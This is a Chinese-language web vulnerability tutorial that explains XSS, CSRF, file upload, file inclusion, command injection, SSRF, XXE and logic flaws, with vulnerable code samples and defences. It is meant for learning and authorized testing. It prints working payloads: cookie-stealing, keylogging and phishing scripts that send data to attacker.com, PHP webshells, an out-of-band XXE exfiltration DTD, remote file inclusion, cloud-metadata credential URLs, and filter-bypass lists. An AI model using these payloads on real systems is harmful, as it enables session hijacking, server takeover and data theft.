# 核心 Web 漏洞

> 本文档系统介绍 Web 应用中最常见的核心漏洞，包括原理、利用方式、典型场景和防护方法。每个漏洞均配有示例代码，帮助理解和复现。

---

## 目录

- [第一章：漏洞分类与概述](#第一章漏洞分类与概述)
- [第二章：SQL 注入](#第二章sql-注入)
- [第三章：XSS 跨站脚本](#第三章xss-跨站脚本)
- [第四章：CSRF 跨站请求伪造](#第四章csrf-跨站请求伪造)
- [第五章：文件上传漏洞](#第五章文件上传漏洞)
- [第六章：文件包含漏洞](#第六章文件包含漏洞)
- [第七章：命令注入](#第七章命令注入)
- [第八章：代码执行](#第八章代码执行)
- [第九章：SSRF 服务端请求伪造](#第九章ssrf-服务端请求伪造)
- [第十章：XXE XML 外部实体注入](#第十章xxe-xml-外部实体注入)
- [第十一章：逻辑漏洞](#第十一章逻辑漏洞)
- [第十二章：其他常见漏洞](#第十二章其他常见漏洞)

---

## 第一章：漏洞分类与概述

### 1.1 OWASP Top 10

OWASP（开放式 Web 应用程序安全项目）每几年发布一次 Top 10 最严重的 Web 应用安全风险：

| 2021 版 | 漏洞名称 | 说明 |
|--------|---------|------|
| A01 | **失效的访问控制** | 权限绕过、越权访问 |
| A02 | **加密机制失效** | 敏感数据明文传输/存储 |
| A03 | **注入** | SQL、NoSQL、OS 命令注入等 |
| A04 | **不安全设计** | 设计层面的安全缺陷 |
| A05 | **安全配置错误** | 默认配置、不必要的功能 |
| A06 | **自带缺陷和过时的组件** | 第三方组件漏洞 |
| A07 | **识别和身份验证失败** | 弱密码、会话固定等 |
| A08 | **软件和数据完整性失效** | CI/CD 流水线不安全 |
| A09 | **安全日志和监控失效** | 缺乏日志和告警 |
| A10 | **服务端请求伪造** | SSRF |

### 1.2 漏洞分类

```
注入类
├── SQL 注入
├── 命令注入
├── 代码执行
├── NoSQL 注入
├── LDAP 注入
├── XXE 注入
└── SSTI 模板注入

客户端漏洞
├── XSS（反射型、存储型、DOM 型）
├── CSRF
├── 点击劫持
└── CORS 配置错误

文件相关
├── 文件上传
├── 文件包含（LFI/RFI）
├── 任意文件读取
├── 任意文件删除
└── 目录遍历

权限相关
├── 水平越权
├── 垂直越权
├── 未授权访问
└── 会话管理漏洞

逻辑漏洞
├── 支付逻辑
├── 验证码绕过
├── 密码找回漏洞
└── 业务流程绕过

其他
├── SSRF
├── 反序列化
├── 弱口令
├── 信息泄露
└── 中间件漏洞
```

---

## 第二章：SQL 注入

详见 `database/数据库安全.md` 中的详细介绍。

**核心要点**：
- 原理：用户输入被拼接到 SQL 语句中执行
- 类型：联合查询、报错注入、布尔盲注、时间盲注、堆叠注入
- 防护：参数化查询（PreparedStatement）、输入验证、最小权限

---

## 第三章：XSS 跨站脚本

### 3.1 漏洞原理

XSS（Cross-Site Scripting）是注入攻击的一种，攻击者在网页中注入恶意脚本，当用户访问页面时脚本执行，从而窃取 Cookie、钓鱼、劫持会话等。

**根本原因**：用户输入未经过滤直接输出到 HTML 页面，浏览器将其当作脚本执行。

### 3.2 XSS 分类

| 类型 | 说明 | 特点 |
|------|------|------|
| **反射型 XSS** | 恶意脚本在 URL 中，服务端反射输出 | 一次性，需要诱导用户点击 |
| **存储型 XSS** | 恶意脚本存入数据库，所有访问者触发 | 危害大，自动触发 |
| **DOM 型 XSS** | 前端 JS 直接操作 DOM，不经过服务端 | 纯前端漏洞，服务端无痕迹 |

### 3.3 反射型 XSS

**漏洞代码**（PHP）：
```php
<?php
// search.php
$keyword = $_GET['keyword'];
echo "<p>搜索结果：" . $keyword . "</p>";
?>
```

**利用**：
```
http://example.com/search.php?keyword=<script>alert(document.cookie)</script>
```

### 3.4 存储型 XSS

**漏洞代码**：
```php
<?php
// 留言板，直接将用户留言存入数据库并输出
$message = $_POST['message'];
// 存入数据库...
// 然后输出
echo "<div class='message'>" . $message . "</div>";
?>
```

**利用**：在留言框提交：
```html
<script>
// 窃取 Cookie 发送到攻击者服务器
var img = new Image();
img.src = "http://attacker.com/steal.php?c=" + document.cookie;
</script>
```

### 3.5 DOM 型 XSS

**漏洞代码**：
```html
<script>
    // 从 URL 获取参数，直接写入页面
    var name = location.hash.substring(1);
    document.getElementById("greet").innerHTML = "你好, " + name;
</script>
<div id="greet"></div>
```

**利用**：
```
http://example.com/index.html#<img src=x onerror=alert(1)>
```

### 3.6 XSS 常用 Payload

```html
<!-- 基础弹窗 -->
<script>alert(1)</script>

<!-- 标签事件 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- 伪协议 -->
<a href="javascript:alert(1)">点击</a>
<iframe src="javascript:alert(1)"></iframe>

<!-- 窃取 Cookie -->
<script>
document.location='http://attacker.com/steal.php?c='+document.cookie
</script>

<script>
new Image().src='http://attacker.com/steal.php?c='+document.cookie
</script>

<!-- 键盘记录 -->
<script>
document.onkeypress = function(e) {
    new Image().src = 'http://attacker.com/key.php?k=' + e.key;
}
</script>

<!-- 钓鱼：伪造登录框 -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
     background:rgba(0,0,0,0.5);z-index:9999;display:flex;
     justify-content:center;align-items:center;">
    <div style="background:white;padding:30px;border-radius:5px;">
        <h3>登录过期，请重新登录</h3>
        <form action="http://attacker.com/phish.php">
            <input type="text" name="user" placeholder="用户名"><br>
            <input type="password" name="pass" placeholder="密码"><br>
            <button type="submit">登录</button>
        </form>
    </div>
</div>
```

### 3.7 XSS 绕过技巧

```html
<!-- 大小写绕过 -->
<IMG SRC=X ONERROR=alert(1)>

<!-- 双写绕过 -->
<scrscriptipt>alert(1)</scrscriptipt>

<!-- 编码绕过 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">

<!-- 空格绕过 -->
<img/src=x/onerror=alert(1)>
<img%09src=x%09onerror=alert(1)>

<!-- 事件绕过（过滤 script 时） -->
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>

<!-- 协议绕过 -->
<a href="data:text/html,<script>alert(1)</script>">click</a>
```

### 3.8 防护方法

1. **输入过滤**：对用户输入进行过滤或转义
2. **输出编码**：根据输出上下文进行正确编码
   - HTML 上下文：`htmlspecialchars()` 转义 `< > " ' &`
   - JS 上下文：Unicode 编码
   - URL 上下文：URL 编码
3. **HttpOnly Cookie**：Cookie 设置 HttpOnly，防止 JS 读取
4. **CSP 内容安全策略**：限制脚本来源和执行
5. **输入长度限制**：合理限制输入长度
6. **使用模板引擎自动转义**：Vue、React 等默认转义

**CSP 示例**：
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

---

## 第四章：CSRF 跨站请求伪造

### 4.1 漏洞原理

CSRF（Cross-Site Request Forgery）攻击者诱导已登录用户访问恶意网站，利用用户的登录状态，以用户身份执行非预期操作。

**攻击成立条件**：
1. 用户已登录目标网站，且 Cookie 有效
2. 用户访问了攻击者控制的恶意页面
3. 目标网站的关键请求没有 CSRF 防护

### 4.2 攻击示例

**场景**：某网站修改密码的接口：
```
POST /change_password.php
参数: new_password=123456
```

**攻击页面**（attacker.com）：
```html
<!-- 自动提交的表单 -->
<body onload="document.getElementById('csrf').submit()">
<form id="csrf" action="http://target.com/change_password.php" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
</form>
</body>
```

用户已登录 target.com，访问 attacker.com 时，浏览器会自动携带 target.com 的 Cookie，发送修改密码请求。

### 4.3 其他利用方式

```html
<!-- GET 型 CSRF：用 img 标签 -->
<img src="http://target.com/delete_user.php?id=123" style="display:none">

<!-- JSON 型 CSRF -->
<script>
fetch('http://target.com/api/change_email', {
    method: 'POST',
    headers: {'Content-Type': 'text/plain'},
    body: '{"email":"hacker@evil.com"}'
});
</script>
```

### 4.4 防护方法

1. **Token 验证**：请求中携带随机 Token，服务端校验
   ```php
   session_start();
   if (empty($_SESSION['csrf_token'])) {
       $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
   }
   // 表单中加入
   echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';
   // 服务端校验
   if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
       die("CSRF 攻击检测");
   }
   ```

2. **SameSite Cookie**：Cookie 设置 SameSite 属性
   ```
   Set-Cookie: session=abc; SameSite=Strict
   Set-Cookie: session=abc; SameSite=Lax
   ```

3. **验证 Referer / Origin**：检查请求来源
4. **二次验证**：敏感操作输入密码或验证码
5. **关键操作使用 POST**：GET 只用于查询

---

## 第五章：文件上传漏洞

### 5.1 漏洞原理

应用程序允许用户上传文件，但未正确验证文件类型、内容和存储方式，导致攻击者可以上传恶意脚本文件（如 Webshell），进而控制服务器。

### 5.2 漏洞分类

| 类型 | 说明 |
|------|------|
| **前端校验绕过** | 仅 JS 校验，可抓包修改 |
| **MIME 类型绕过** | 仅校验 Content-Type，可修改 |
| **后缀名绕过** | 黑名单不全、大小写、特殊后缀 |
| **.htaccess 绕过** | 上传 .htaccess 自定义解析 |
| **文件头绕过** | 只校验文件头，添加 GIF89a 等 |
| **解析漏洞** | 利用中间件解析特性 |
| **00 截断** | 利用 %00 截断文件名 |

### 5.3 常见绕过方式

**前端 JS 校验绕过**：
- 浏览器禁用 JS
- 抓包修改文件名和 Content-Type

**MIME 类型绕过**：
```
Content-Type: image/jpeg 改为 image/jpeg
Content-Type: application/octet-stream 改为 image/gif
```

**后缀名绕过（黑名单不全）**：
```
.php → .php3 .php4 .php5 .phtml .phps
.asp → .asa .aspx .ascx .ashx
.jsp → .jspx .jspf
```

**大小写绕过**：
```
.php → .Php .PHP .pHP
```

**双写绕过**：
```
.php → .pphphp
```

**特殊后缀（Windows）**：
```
shell.php → shell.php.
shell.php → shell.php空格
shell.php → shell.php:1.jpg
shell.php → shell.php::$DATA
```

**%00 截断**（PHP < 5.3.4）：
```
shell.php%00.jpg
```

**.htaccess 绕过**：
```
AddType application/x-httpd-php .jpg
```
上传 .htaccess 文件后，所有 .jpg 文件都会被当作 PHP 解析。

**文件头绕过**：
在 Webshell 前添加图片文件头：
```
GIF89a
<?php eval($_POST['cmd']);?>
```

### 5.4 解析漏洞

**Apache 解析漏洞**：
```
test.php.jpg  →  按 PHP 解析（从右往左找认识的后缀）
```

**IIS 6.0 解析漏洞**：
```
test.asp;xxx.jpg  →  按 ASP 解析
/xxx.asp/1.jpg    →  按 ASP 解析目录下的文件
```

**Nginx 解析漏洞**：
```
test.jpg/x.php    →  按 PHP 解析
```

### 5.5 防护方法

1. **白名单校验后缀名**：只允许指定类型（如 jpg、png、gif）
2. **文件内容检测**：使用 getimagesize()、finfo 等检测真实类型
3. **文件重命名**：随机文件名 + 时间戳
4. **存储目录隔离**：上传目录不可执行，放在 Web 目录外
5. **设置文件权限**：上传目录无执行权限
6. **使用 CDN / 对象存储**：第三方存储隔离风险
7. **文件头校验 + 二次渲染**：对图片重新生成

---

## 第六章：文件包含漏洞

### 6.1 漏洞原理

当应用程序使用文件包含函数（如 PHP 的 include、require），且包含的文件路径用户可控时，攻击者可以通过修改路径包含恶意文件，执行任意代码。

### 6.2 分类

| 类型 | 说明 |
|------|------|
| **LFI 本地文件包含** | 包含服务器本地文件 |
| **RFI 远程文件包含** | 包含远程 URL 文件（需 allow_url_include=On） |

### 6.3 本地文件包含（LFI）

**漏洞代码**：
```php
<?php
$page = $_GET['page'];
include($page . '.php');
?>
```

**利用**：
```
?page=../../../../etc/passwd       # 读取系统文件
?page=../../../../windows/win.ini  # Windows
```

**PHP 伪协议利用**：
```
# 读取源码（Base64 编码）
?page=php://filter/read=convert.base64-encode/resource=config

# 执行 PHP 代码（php://input）
?page=php://input
POST 数据: <?php system('whoami');?>

# 读取文件（php://filter）
?page=file:///etc/passwd

# 压缩流
?page=php://filter/zlib.deflate/convert.base64-encode/resource=index
```

**包含日志文件 GetShell**：
```
1. 访问 URL 注入 PHP 代码到日志
   /<?php eval($_POST[cmd]);?>
   (User-Agent 中也可以注入)

2. 包含日志文件
   ?page=../../../../var/log/apache2/access.log
   ?page=../../../../var/log/nginx/access.log
```

**包含 session 文件**：
```
?page=../../../../tmp/sess_sessionid
```

### 6.4 远程文件包含（RFI）

**条件**：`allow_url_include = On`（PHP 配置）

**漏洞代码**：
```php
<?php
$page = $_GET['page'];
include($page);
?>
```

**利用**：
```
?page=http://attacker.com/shell.txt
```
远程文件内容为 `<?php eval($_POST['cmd']);?>`，执行后获得 Webshell。

### 6.5 防护方法

1. **白名单限制**：只允许包含指定文件
2. **禁用远程包含**：`allow_url_include = Off`
3. **路径限制**：`open_basedir` 限制可访问目录
4. **硬编码包含路径**：不要让用户控制包含路径
5. **输入过滤**：过滤 `..`、`/`、`\` 等特殊字符

---

## 第七章：命令注入

### 7.1 漏洞原理

应用程序调用系统命令时，用户输入被拼接到命令中执行，导致攻击者可以注入恶意命令。

### 7.2 危险函数

**PHP**：
```php
system()
exec()
shell_exec()
passthru()
popen()
proc_open()
反引号 ``
```

**Python**：
```python
os.system()
os.popen()
subprocess.call(shell=True)
```

**Java**：
```java
Runtime.getRuntime().exec()
ProcessBuilder
```

### 7.3 漏洞示例

**漏洞代码**：
```php
<?php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
?>
```

**利用**：
```
?ip=127.0.0.1; whoami
?ip=127.0.0.1 | whoami
?ip=127.0.0.1 && whoami
?ip=127.0.0.1 || whoami
```

### 7.4 命令连接符

| 符号 | 说明 |
|------|------|
| `;` | 顺序执行，前面执行完执行后面 |
| `&&` | 前面成功才执行后面 |
| `||` | 前面失败才执行后面 |
| `|` | 管道符，前面输出作为后面输入 |
| `&` | 后台执行 |
| `$()` | 命令替换 |
| `` ` `` | 反引号，命令替换 |
| `\n` | 换行执行 |

### 7.5 绕过技巧

**空格过滤**：
```
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
```

**关键字过滤**：
```
# 拼接
a=ca;b=t;$a$b /etc/passwd

# 编码
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# 反斜杠绕过
c\at /e\tc/passwd

# 通配符
cat /etc/pa??wd
cat /etc/pass*
```

**Windows 特殊**：
```
ipconfig&whoami
ipconfig&&whoami
ipconfig|whoami
%0a 换行
```

### 7.6 防护方法

1. **尽量不用系统命令**：用语言内置函数替代
2. **使用参数数组**：避免 shell 解析
   ```python
   subprocess.run(['ping', '-c', '4', ip], shell=False)  # 安全
   subprocess.run(f"ping -c 4 {ip}", shell=True)         # 危险
   ```
3. **输入白名单校验**：只允许合法字符
4. **转义特殊字符**：
   - PHP: `escapeshellarg()`、`escapeshellcmd()`
   - Python: `shlex.quote()`

---

## 第八章：代码执行

### 8.1 漏洞原理

应用程序将用户输入作为代码执行，导致攻击者可以执行任意代码。

### 8.2 常见危险函数

**PHP**：
```php
eval()
assert()
preg_replace() /e 修饰符
create_function()
call_user_func()
array_map()
usort()
```

**Python**：
```python
eval()
exec()
pickle.loads()  # 反序列化
yaml.load()     # 不安全加载
```

**Java**：
```java
Runtime.getRuntime().exec()
ScriptEngine eval
JNI 调用
```

### 8.3 漏洞示例

**PHP eval()**：
```php
<?php
$str = $_GET['str'];
eval("\$str = \"$str\";");
?>
```
利用：`?str=${phpinfo()}` 或 `?str={${phpinfo()}}`

**PHP assert()**：
```php
<?php
assert($_GET['code']);
?>
```
利用：`?code=phpinfo()`

**Python eval()**：
```python
code = input("输入表达式: ")
result = eval(code)  # 危险！
```
利用：`__import__('os').system('whoami')`

### 8.4 防护方法

1. **避免使用危险函数**：用安全的替代方案
2. **不要将用户输入传入 eval/exec**
3. **沙箱隔离**：如必须执行，在沙箱中运行
4. **输入严格过滤**：白名单校验

---

## 第九章：SSRF 服务端请求伪造

### 9.1 漏洞原理

SSRF（Server-Side Request Forgery）攻击者诱导服务端发起请求，访问或攻击内网资源。服务端作为代理，可以访问内网、本地服务、云服务元数据等。

### 9.2 常见触发点

- 图片加载/下载：`?img_url=http://...`
- 在线预览/抓取
- 第三方 API 调用
- 文件处理（XML 解析中也可能有）
- 分享功能
- 订阅功能（RSS）

### 9.3 利用方式

**探测内网**：
```
?url=http://127.0.0.1:3306    # 探测 MySQL
?url=http://192.168.1.1:80    # 内网 Web
?url=http://10.0.0.1:22       # 内网 SSH
```

**访问本地敏感文件**（部分场景）：
```
?url=file:///etc/passwd
?url=file:///c:/windows/win.ini
```

**云服务元数据**（AWS）：
```
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**利用 Gopher 协议**：
```
?url=gopher://127.0.0.1:3306/_...
# 构造 MySQL 请求、Redis 请求等
```

**攻击内网 Redis**：
```
?url=dict://127.0.0.1:6379/info
```

### 9.4 绕过方式

**IP 地址绕过**：
```
# 十进制
http://2130706433/   = 127.0.0.1

# 八进制
http://0177.0.0.1/

# 十六进制
http://0x7f000001/

# 短地址
http://127.1
http://127.0.1
http://0  (=0.0.0.0)

# DNS 解析
http://localhost
http://0.0.0.0
```

**URL 解析差异**：
```
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://attacker.com\127.0.0.1
```

**协议绕过**：
```
file:///
dict://
gopher://
ftp://
http://
https://
```

### 9.5 防护方法

1. **白名单限制**：只允许指定的域名或协议
2. **禁止访问内网**：解析域名后检查 IP 是否为内网地址
3. **禁用危险协议**：只允许 http/https，禁用 file/gopher/dict
4. **统一错误信息**：不泄露端口、协议等信息
5. **限制请求方法**：只允许 GET，禁止其他方法
6. **使用独立网络环境**：云环境使用独立实例

---

## 第十章：XXE XML 外部实体注入

### 10.1 漏洞原理

XML 解析器在解析 XML 时，允许引用外部实体（External Entity），攻击者可以构造恶意 XML 读取敏感文件、执行命令、发起 SSRF 等。

### 10.2 漏洞示例

**读取本地文件**：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**SSRF**：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
]>
<foo>&xxe;</foo>
```

**Blind XXE（OOB 外带）**：
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>
```

evil.dtd：
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### 10.3 PHP 中的 XXE

```php
// 危险：LIBXML_NOENT 开启外部实体
$xml = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
```

### 10.4 防护方法

1. **禁用外部实体**：
   - PHP: `libxml_disable_entity_loader(true);`
   - Java: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
   - Python: `defusedxml` 库
2. **使用 JSON 替代 XML**
3. **更新 XML 解析库**

---

## 第十一章：逻辑漏洞

### 11.1 概述

逻辑漏洞是业务流程设计缺陷导致的安全问题，不是技术层面的漏洞，而是逻辑层面的漏洞。

### 11.2 常见逻辑漏洞

#### 越权访问

**水平越权**：A 用户访问 B 用户的数据（同一权限级别）
```
/user/info?id=1  →  修改 id=2 查看其他用户信息
```

**垂直越权**：普通用户访问管理员功能
```
普通用户直接访问 /admin/user_list 页面
```

**防护**：每次操作都校验用户权限，不仅靠前端隐藏。

#### 支付逻辑漏洞

- 修改价格：抓包改商品价格
- 修改数量：负数数量、0 元购买
- 修改订单状态：直接改状态为"已支付"
- 优惠券复用：同一张优惠券多次使用
- 并发竞争：利用并发条件重复扣减

**防护**：
- 服务端重新计算价格，不相信客户端
- 数据库事务 + 乐观锁/悲观锁
- 幂等性设计

#### 密码找回漏洞

- 验证码暴力破解
- 验证码回显在响应包中
- 修改用户 ID 重置他人密码
- 重置 Token 可预测
- 弱密保问题

#### 注册与登录逻辑

- 注册时用户名空格、特殊字符
- 短信验证码无次数限制
- 会话固定攻击
- 密码明文传输/存储

---

## 第十二章：其他常见漏洞

### 12.1 反序列化漏洞

**原理**：应用程序将用户可控的数据反序列化，触发恶意构造的对象中的魔术方法，导致代码执行。

**PHP 反序列化**：
```php
// 危险代码
$data = unserialize($_GET['data']);

// 利用：构造恶意对象，触发 __destruct()、__wakeup() 等魔术方法
```

**Java 反序列化**：
- Commons Collections 漏洞
- Fastjson 漏洞
- Jackson 漏洞
- Shiro 反序列化

### 12.2 目录遍历

**原理**：应用程序允许用户控制文件路径，但未正确过滤 `../` 等路径穿越字符。

```
/download?file=../../../../etc/passwd
/view?path=..\..\..\windows\win.ini
```

### 12.3 信息泄露

- 目录浏览（目录索引）
- 错误信息泄露（数据库错误、路径泄露）
- 备份文件泄露（.bak、.swp、.git、.svn）
- 源码泄露（.php~、.phps、.bak）
- 配置文件泄露
- 版本信息泄露（Server 头、X-Powered-By）
- API 文档泄露

### 12.4 弱口令与暴力破解

- 后台弱密码（admin/admin、admin/123456）
- 无登录次数限制
- 无验证码或验证码可绕过
- 用户名枚举（不同错误提示）

### 12.5 CORS 配置错误

**原理**：跨域资源共享配置不当，允许任意域名读取敏感数据。

**危险配置**：
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**利用**：攻击者网站通过 AJAX 跨域读取用户数据。

### 12.6 点击劫持

**原理**：通过透明 iframe 覆盖在正常页面上，诱导用户点击。

**防护**：
- `X-Frame-Options: DENY / SAMEORIGIN`
- CSP `frame-ancestors`

---

## 漏洞示例代码

详见 `vulnerabilities/` 目录中的示例代码：
- `xss/` — XSS 漏洞示例（反射型、存储型、DOM 型）
- `csrf/` — CSRF 漏洞示例
- `upload/` — 文件上传漏洞示例
- `sqli/` — SQL 注入漏洞示例

> ⚠️ **安全提示**：本文档仅用于安全学习和授权测试，禁止用于任何非法用途。使用漏洞技术攻击未授权的系统属于违法行为。

> **延伸学习**：掌握核心漏洞原理后，可进一步学习各漏洞的高级利用技巧、绕过 WAF、漏洞挖掘思路、靶场实战（DVWA、Pikachu、Upload-labs、SQLi-labs 等）。
